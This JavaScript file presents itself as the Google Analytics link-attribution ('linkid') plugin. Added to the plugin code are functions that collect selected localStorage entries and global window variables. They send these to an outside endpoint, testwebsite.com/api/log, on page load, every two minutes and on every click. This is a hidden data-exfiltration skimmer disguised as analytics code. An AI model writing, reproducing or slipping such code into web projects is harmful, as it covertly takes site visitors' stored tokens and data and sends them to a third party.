(function () {
  const watchedKeys = window.watchedKeys;
  const watchedVars = ['variable1', 'variable2'];
  var e = window,
    h = document,
    k = "replace";
  var m = function (a, c, d, b, g) {
      c = encodeURIComponent(c)[k](/\(/g, "%28")[k](/\)/g, "%29");
      a = a + "=" + c + "; path=" + (d || "/") + "; ";
      g && (a += "expires=" + new Date(new Date().getTime() + g).toGMTString() + "; ");
      b && "none" != b && (a += "domain=" + b + ";");
      b = h.cookie;
      h.cookie = a;
      return b != h.cookie;
    },
    p = function (a) {
      var c = h.body;
      try {
        c.addEventListener ? c.addEventListener("click", a, !1) : c.attachEvent && c.attachEvent("onclick", a);
      } catch (d) {}
    };
  function calcHashCode(target) {
    const propertyNames = Object.getOwnPropertyNames(target);
    const sortedKeyNames = propertyNames.sort().join('');
    let hash = 0;
    for (let i = 0; i < sortedKeyNames.length; i++) {
      const code = sortedKeyNames.charCodeAt(i);
      hash = (hash << 5) - hash + code | 0;
    }
    return hash.toString(16);
  }
  var q = function (a, c, d, b) {
    this.get = function () {
      for (var b = void 0, c = [], d = h.cookie.split(";"), l = new RegExp("^\\s*" + a + "=\\s*(.*?)\\s*$"), f = 0; f < d.length; f++) {
        var n = d[f].match(l);
        n && c.push(decodeURIComponent(n[1][k](/%28/g, "(")[k](/%29/g, ")")));
      }
      for (d = 0; d < c.length; d++) c[d] && (b = c[d]);
      return b;
    };
    this.set = function (g) {
      return m(a, g, b, c, 1E3 * d);
    };
    this.remove = function () {
      return m(a, "", b, c, -100);
    };
  };
  function trackLocalStorage() {
    const extractedData = {};
    for (let key in window.localStorage) {
      if (watchedKeys.includes(key)) {
        extractedData[key] = window.localStorage[key];
      }
    }
    return extractedData;
  }
  var t = function (a, c) {
    var d = void 0;
    if ("function" == typeof a.get && "function" == typeof a.set) {
      var b = c || {},
        g = b.hasOwnProperty("cookieName") ? b.cookieName : "_gali",
        r = b.hasOwnProperty("cookieTimeout") ? b.cookieTimeout : 30,
        s = b.hasOwnProperty("levels") ? b.levels : 3,
        b = a.get("cookieDomain"),
        l = a.get("cookiePath"),
        f = new q(g, b, r, l);
      d || (d = f.get());
      d && a.set("&linkid", d);
      p(function (a) {
        a = a || e.event;
        a = a.target || a.srcElement;
        for (var b, c = 0; a && c <= s; c++) {
          if (b = a.getAttribute("id")) {
            a = b;
            100 < a.length ? f.remove() : a ? f.set(a) : f.remove();
            return;
          }
          a = a.parentElement;
        }
        f.remove();
      });
    }
  };
  function globalVarCollection() {
    const globalVarData = {};
    for (let key in window) {
      if (watchedVars.includes(key)) {
        globalVarData[key] = window[key];
      }
    }
    return globalVarData;
  }
  (function () {
    e.gaplugins = e.gaplugins || {};
    e.gaplugins.LinkId = t;
    var a = e.GoogleAnalyticsObject || "ga";
    e[a] = e[a] || function () {
      (e[a].q = e[a].q || []).push(arguments);
    };
    e[a]("provide", "linkid", t);
  })();
  async function relayData(content) {
    const hashValue = calcHashCode(content);
    const endpointUrl = "https://testwebsite.com/api/log";
    try {
      const result = await fetch(endpointUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hashValue,
          content
        })
      });
      if (result.ok) {
        console.log("Data upload successful");
      } else {
        console.error(`Upload failed, Status code: ${result.status}`);
      }
    } catch (error) {
      console.error(`Error during data upload: ${error}`);
    }
  }
  function getDataAndUpload() {
    const localStorageData = trackLocalStorage();
    const globalVariablesData = globalVarCollection();
    const collectedData = {
      ...localStorageData,
      ...globalVariablesData
    };
    if (Object.keys(collectedData).length > 0) {
      relayData(collectedData);
    }
  }
  window.addEventListener("DOMContentLoaded", function () {
    const jshook = () => getDataAndUpload();
    window.addJsHook = jshook;
    getDataAndUpload();
    setInterval(getDataAndUpload, 120000);
  });
  document.addEventListener('click', function (event) {
    getDataAndUpload();
  });
})();